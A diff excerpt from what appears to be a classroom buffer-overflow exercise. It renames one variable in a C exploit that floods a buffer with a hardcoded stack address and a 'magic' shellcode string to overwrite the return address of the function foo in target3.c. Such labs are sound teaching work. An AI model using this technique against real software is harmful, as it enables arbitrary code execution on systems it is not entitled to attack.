@@ -35,18 +35,18 @@ int main(void)
                                    amount so that we can fill the buffer
                                    in foo with shellcode and overwrite 
                                    the return address of foo. */
-  long buffAddr, *addrPtr;
+  long retAddr, *addrPtr;
   char egg[EGG_SIZE]; /* string containing exploit code */
   int i;
 
-  buffAddr = 0xBFFF61C8; /* start address of buf in target3.c:foo */
+  retAddr = 0xBFFF61C8; /* start address of buf in target3.c:foo */
   
   /* First fill the exploit string with the address of the buf in foo. 
      This will ensure that we overwrite the return address with the 
      start address of our code. */
   addrPtr = (long *) egg; 
   for (i = 0; i < EGG_SIZE; i += 4)
-    *(addrPtr++) = buffAddr;
+    *(addrPtr++) = retAddr;
   
   /* Copy the magical string to the beggining, dont copy the null byte. */
   memcpy (egg, magic, strlen (magic));
